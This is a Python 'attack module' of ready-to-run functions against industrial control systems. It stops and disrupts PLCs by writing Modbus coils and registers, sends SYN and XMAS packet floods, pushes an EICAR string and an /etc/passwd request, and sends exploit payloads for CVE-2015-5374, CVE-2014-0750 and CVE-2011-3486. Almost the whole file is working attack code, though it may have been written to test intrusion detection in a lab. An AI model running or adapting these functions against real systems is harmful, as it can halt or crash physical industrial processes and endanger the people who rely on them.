from scapy.all import *
from pymodbus.client.sync import ModbusTcpClient
from pymodbus.exceptions import *


time_out = 2


def plc_status_check(target):
    client = ModbusTcpClient(target, timeout=time_out)
    try:
        status = client.read_coils(0x00, count=3)
        if status.bits == [1, 0, 0, 0, 0, 0, 0, 0]:
            status = "Running"
        elif status.bits == [0, 1, 0, 0, 0, 0, 0, 0]:
            status = "Idle"
        elif status.bits == [0, 0, 1, 0, 0, 0, 0, 0]:
            status = "Stopped"
        else:
            status = "Broken"
        pass
    except ConnectionException:
        status = "No connection"
        pass
    except(ModbusIOException, ParameterException, ModbusException, InvalidMessageReceivedException,
           MessageRegisterException, NoSuchSlaveException, NotImplementedException):
        status = "Connection was forcibly closed by the remote host"
        pass
    client.close()
    return status


def mb_stop(target):
    client = ModbusTcpClient(target, timeout=time_out)
    try:
        attack = client.write_registers(0x109c, 0)
        status = str(attack)
        pass
    except ConnectionException:
        status = "Error: No connection to target"
        pass
    except(ModbusIOException, ParameterException, ModbusException, InvalidMessageReceivedException,
           MessageRegisterException, NoSuchSlaveException, NotImplementedException):
        status = "Error:" + str(sys.exc_info()[0])
        pass
    client.close()
    return status


def mb_disrupt(target):
    client = ModbusTcpClient(target, timeout=time_out)
    try:
        attack = client.write_coils(0x0000, [1, 1, 1])
        status = str(attack)
    except ConnectionException:
        status = "Error: No connection to target"
    except(ModbusIOException, ParameterException, ModbusException, InvalidMessageReceivedException,
           MessageRegisterException, NoSuchSlaveException, NotImplementedException):
        status = "Error:" + str(sys.exc_info()[0])
        pass
    client.close()
    return status


def mb_restore(target):
    client = ModbusTcpClient(target)
    try:
        attack = client.write_registers(0x109c, 256)
        status = str(attack)
    except ConnectionException:
        status = "Error: No connection to target"
        pass
    except(ModbusIOException, ParameterException, ModbusException, InvalidMessageReceivedException,
           MessageRegisterException, NoSuchSlaveException, NotImplementedException):
        status = "Error:" + str(sys.exc_info()[0])
        pass
    client.close()
    return status


def dos_syn(target):
    dst_port = (1, 3000)
    src_port = RandShort()
    sr1(IP(dst=target) / TCP(sport=src_port, dport=dst_port), timeout=1, verbose=0)
    return ""


def dos_xmas(target):
    dst_port = (1, 3000)
    src_port = RandShort()
    sr1(IP(dst=target) / TCP(sport=src_port, dport=dst_port, flags="FPU"), timeout=1, verbose=0)
    return ""


def malware_eicar(target):
    payload_str = "00 90 e8 6e 33 71 08 00 27 ac 4b 86 08 00 45 00 " \
                  "00 60 00 30 00 00 80 11 00 00 c0 a8 0a 55 c0 a8 " \
                  "0a 0d c0 11 04 d2 00 4c 96 10 58 35 4f 21 50 25 " \
                  "40 41 50 5b 34 5c 50 5a 58 35 34 28 50 5e 29 37 " \
                  "43 43 29 37 7d 24 45 49 43 41 52 2d 53 54 41 4e " \
                  "44 41 52 44 2d 41 4e 54 49 56 49 52 55 53 2d 54 " \
                  "45 53 54 2d 46 49 4c 45 21 24 48 2b 48 2a"
    payload = bytearray.fromhex(payload_str.replace(' ', ''))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(payload, (target, 1234))
    sock.close()
    return ""


def malware_passwd(target):
    payload = bytearray("GET /etc/passwd HTTP/1.1\r\n", 'utf-8')
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3)
    try:
        sock.connect((target, 80))
    except socket.error as exc:
        status = "Connection error: " + str(exc)
    else:
        sock.send(payload)
        sock.close()
        status = ""
    return status


def cve_2015_5374(target):
    payload = bytearray.fromhex('11 49 00 00 00 00 00 00 00 00 00 00 00 00 00 00 28 9E'.replace(' ', ''))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(payload, (target, 50000))
    sock.close()
    return ""


def cve_2014_0750(target):
    payload = bytearray("GET /CimWeb/gefebt.exe?\\\\" + target +
                        "\\mHQ\\jsM0.bcl HTTP/1.1\r\n"
                        "Host: 192.168.10.13\r\n"
                        "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n\r\n",
                        'utf-8')
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3)
    try:
        sock.connect((target, 80))
    except socket.error as exc:
        status = "Connection error: " + str(exc)
    else:
        sock.send(payload)
        sock.close()
        status = ""
    return status


def cve_2011_3486(target):
    payload = bytearray.fromhex('03661471' + '0' * 32 + 'f' * 3028)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(payload, (target, 48899))
    sock.close()
    return ""


if __name__ == '__main__':
    print("Attack module v.1.0 by Sever Sudakov")

